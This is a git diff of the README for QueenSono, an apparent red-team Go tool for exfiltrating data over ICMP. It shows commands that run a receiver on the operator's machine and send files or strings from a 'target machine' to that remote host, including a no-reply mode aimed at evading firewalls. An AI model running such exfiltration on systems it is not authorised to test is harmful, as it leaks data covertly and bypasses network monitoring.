@@ -1,4 +1,5 @@
 
+
   <h1 align="center">QueenSono <i> ICMP Data Exfiltration </i></h1>
 <h4 align="center"> A Golang Package for Data Exfiltration with ICMP protocol. </h4>
   <p align="center">
@@ -45,11 +46,19 @@ All commands and flags of the binaries could be found using `--help`
 On my local machine:
 
     $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt
- 
 
- - `-l 0.0.0.0` listen on all interfaces for ICMP packet
- - `-f received_bible.txt` save received data in a text
- - `-p` show a progress bar of received data
+<details>
+  <summary><b>Explanation<b></summary>
+    <li>
+    <code>-l 0.0.0.0</code>listen on all interfaces for ICMP packet
+    </li>
+    <li>
+      <code>-f received_bible.txt</code> save received data in a text
+    </li>
+    <li><code>-p</code> show a progress bar of received data </li>
+
+</details>
+
 
 On target machine:
 
@@ -57,19 +66,43 @@ On target machine:
     $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt
 
 <details>
-  <summary>Explanation</summary>
-  <ol>
+  <summary><b>Explanation</b></summary>
     <li>
-    <code>send file</code> for sending file (`bible.txt` is the file in question)
+    <code>send file</code> for sending file (<code>bible.txt</code> is the file in question)
     </li>
     <li>
       <code>-d 2</code> send a packet each 2 seconds
     </li>
-    <li><code>-l 127.0.0.1</code> the listening address for *echo reply* </li>
-    <li><code>-r 10.0.0.92</code>` the address of my remote machine with `qsreceiver` listening</li>
+    <li><code>-l 127.0.0.1</code> the listening address for <i>echo reply</i> </li>
+    <li><code>-r 10.0.0.92</code> the address of my remote machine with <code>qsreceiver</code> listening</li>
     <li><code>-s 50000</code> the data size I want to send in each packet</li>
-  </ol>
 </details>
 
 
+### Example 2: Send without "ACK"
+*\> In this example we want to send a message without waiting for echo reply (it could be useful in the case if target firewall filter incoming icmp packet)*
 
+On my local machine:
+
+    $ qsreceiver receive truncated 1 -l 0.0.0.0
+ 
+
+<details>
+  <summary> <b>Explanation</b></summary>
+    <li><code>receive truncated 1</code> does not wait indefinitely if we don't received all the packets. (<code>1</code> is the delay used with <code>qssender</code>)</li>
+</details>
+
+
+On target machine:
+
+    $ qssender send "thisisatest i want to send a string w/o waiting for the echo reply" -d 1 -l 127.0.0.1 -r 10.0.0.190 go.mod -s 1 -N
+<details>
+  <summary>Explanation</summary>
+    <li>
+    <code>-N</code> noreply option (don't wait for <i>echo reply</i>)
+    </li>
+</details>
+
+### Notes
+- only work on Linux  (due to the use of golang net icmp package)
+- need `cap_net_raw capabilities`
